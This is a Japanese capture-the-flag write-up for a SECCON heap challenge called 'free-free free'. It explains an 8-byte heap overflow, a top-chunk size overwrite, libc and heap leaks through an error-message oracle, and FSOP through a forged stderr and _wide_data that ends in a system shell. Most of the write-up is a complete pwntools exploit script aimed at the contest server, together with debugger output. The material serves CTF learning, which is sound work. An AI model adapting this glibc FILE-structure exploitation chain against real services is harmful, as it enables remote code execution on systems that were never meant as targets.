# free-free free
いわゆるnote問っぽいheap exploit。release関数があるがfree()が呼ばれていない。

脆弱性はalloc関数でData構造体を確保するときに適切なサイズで確保されていないので、edit時に8bytesのheap overflowが発生する。  
free()がない、heap overflowが存在するの2条件からtop chunkのサイズを書き換えて無理やりfreedなchunkをheap上に作成するテクニック(house of orangeという手法の1パートだった気がする)を思いつく。

またalloc時に構造体を初期化していないので、Data->nextの位置にlibcのアドレスがある状態を作れる。
例えば以下を実行するとhead変数はlibcのアドレスを指すようになる。

```python
     id_x = alloc(0x400)
     free(id_x)
     id_x = alloc(0x400)
     free(id_x)
     id_x = alloc(0x400)
     edit(id_x,b'a'*0x3f8+p64(0x141)[:-1])       # overwrite top chunk size
     free(id_x)
 
     for i in range(7):
         for j in range(3):
             id_x = alloc(0x400)
             free(id_x)
         id_x = alloc(0x280)
         edit(id_x,b'a'*0x278+p64(0x141)[:-1])   # overwrite top chunk size
         free(id_x)
     id_x = alloc(0x400)
     free(id_x)
 
     id_x = alloc(0x20)                         # allocated from unsorted bin
     free(id_x)                                 # head->libc
```

```
gef> x/2gx &head
0x555555558040 <head>:  0x00007ffff7faeb40      0x0000000000000000
gef> x/20gx 0x7ffff7faeb40-0x40
0x7ffff7faeb00: 0x0000000000000000      0x0000000000000000
0x7ffff7faeb10: 0x0000000000000000      0x0000000000000000
0x7ffff7faeb20: 0x0000555555669410      0x0000555555647ef0
0x7ffff7faeb30: 0x0000555555647ef0      0x0000555555647ef0
0x7ffff7faeb40: 0x00007ffff7faeb30      0x00007ffff7faeb30
0x7ffff7faeb50: 0x00007ffff7faeb40      0x00007ffff7faeb40
0x7ffff7faeb60: 0x00007ffff7faeb50      0x00007ffff7faeb50
```

0x7ffff7faeb40はlibc内のアドレス(small bin)であり、また0x7ffff7faeb40をData構造体としてみると、bufに当たる0x7ffff7faeb50は自身を指しているので、この状態でeditを行うと(id=0x7fff, size=0xf7faeb30)、nextを編集することができてAAWが作れる。

show関数的なものがないが、edit&release時に存在しないIDを指定すると"Not found"が出力するoracleやedit時に`printf("data(%u): ",...)`を実行してくれているので、ここからlibcリーク&heapリークができる。

AAWができるのでFSOPをしてシェルを取得する。

```python
#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall.ptc"
#"""
HOST = "free3.seccon.games"
PORT = 8215
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]

libc = ELF('./libc.so.6')
off_stderr = libc.symbols["_IO_2_1_stderr_"]
off_system = libc.symbols["system"]
local_base = 0x7ffff7dab000 
off_bins = 0x00007ffff7faec10 - local_base
off_wfile_jumps = 0x7ffff7fad228 - local_base

def alloc(size):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(": ", str(size))
	conn.recvuntil("ID:")
	aid = int(conn.recvuntil(" "),16)
	return aid

def edit(aid, data):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter(": ", str(aid))
	conn.sendafter(": ", data)

def free(aid):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter(": ", str(aid))

def exploit():
	
	id_x = alloc(0x400)
	free(id_x)
	id_x = alloc(0x400)
	free(id_x)
	id_x = alloc(0x400)
	edit(id_x,b'a'*0x3f8+p64(0x141)[:-1])		# overwrite top chunk size
	free(id_x)

	for i in range(7):
		for j in range(3):
			id_x = alloc(0x400)
			free(id_x)
		id_x = alloc(0x280)
		edit(id_x,b'a'*0x278+p64(0x141)[:-1])	# overwrite top chunk size
		free(id_x)
	id_x = alloc(0x400)
	free(id_x)

	id_x = alloc(0x20)
	free(id_x)

	# libc leak
	conn.recvuntil("> ")
	for i in range(0x7fff, 0x7e00, -1):
		conn.sendline("3")
		conn.sendlineafter(": ", str(i))
		if not b'Not found' in conn.recv():
			print("[+] upper = 0x%x"%i)
			upper_addr_libc = i
			break
	conn.sendline("2")
	conn.sendlineafter(": ", str(upper_addr_libc))
	conn.recvuntil("data(")
	lower_addr_libc = int(conn.recvuntil(")")[:-1])
	addr_bins = ((upper_addr_libc << 32) | lower_addr_libc)
	addr_libc = addr_bins -  off_bins
	conn.sendafter(": ", p64(0xdeadbeef)*2+b'\n') # danger
	
		
	for i in range(14):
		free(upper_addr_libc)

	# heap leak
	conn.recvuntil("> ")
	for i in range(0x5500, 0x5700):
		conn.sendline("2")
		conn.sendlineafter(": ", str(i))
		tmp = conn.recv()
		if not b'Not found' in tmp:
			upper_addr_heap = i
			break
	lower_addr_heap = int(tmp.split(b"data(")[1].split(b")")[0])
	off_heap = 0x0000555555647ef0 - 0x55555555a000
	addr_heap = ((upper_addr_heap << 32) | lower_addr_heap) - off_heap
	
	conn.send(p64(addr_libc+off_stderr-0x28)[:-1]+b'\n') 
	free(upper_addr_libc)

	off_wide_data = 0x0000555555669430 - 0x55555555a000  

	fake_stderr = b''
	fake_stderr += p32(0xfbad0101)						# _flags
	fake_stderr += b';sh;'
	fake_stderr += b"\x00"*(0x20-len(fake_stderr))
	fake_stderr += p64(0) 								# _IO_write_base
	fake_stderr += p64(1) 								# _IO_write_ptr
	fake_stderr += b"\x00"*(0x88-len(fake_stderr))
	fake_stderr += p64(addr_heap+off_wide_data) 				# _wide_data
	fake_stderr += b"\x00"*(0xa0-len(fake_stderr))
	fake_stderr += p64(addr_heap+off_wide_data) 				# _wide_data
	fake_stderr += b"\x00"*(0xc0-len(fake_stderr))
	fake_stderr += p64(0) 								# _mode
	fake_stderr += b"\x00"*(0xd8-len(fake_stderr))
	fake_stderr += p64(addr_libc+off_wfile_jumps)		# _vtable
	
	fake_stderr = p64(0)*3 + fake_stderr
	fake_stderr += b'\n'

	edit(upper_addr_libc, fake_stderr)
	
	fake_wide_data = b''
	fake_wide_data += b'\x00'*(0x20-len(fake_wide_data))
	fake_wide_data += p64(0)							# _IO_write_base
	fake_wide_data += b'\x00'*(0x58-len(fake_wide_data))
	fake_wide_data += p64(0)							# _IO_buf_base
	fake_wide_data += b'\x00'*(0x68-len(fake_wide_data))
	fake_wide_data += p64(addr_libc+off_system)			# _vtable->_setbuf
	fake_wide_data += b'\x00'*(0xe0-len(fake_wide_data))
	fake_wide_data += p64(addr_heap+off_wide_data)			# _vtable
	fake_wide_data += b'\n'
	
	wide_data_id = alloc(0x400)
	#
	conn.sendlineafter(">", "2")
	conn.sendlineafter(": ", str(wide_data_id))
	conn.sendafter(": ", fake_wide_data)
	
	conn.sendlineafter(">", "5")
	
	print("[+] addr_libc = "+hex(addr_libc))
	print("[+] addr_heap = "+hex(addr_heap))
	conn.interactive()	

if __name__ == "__main__":
	exploit()
```
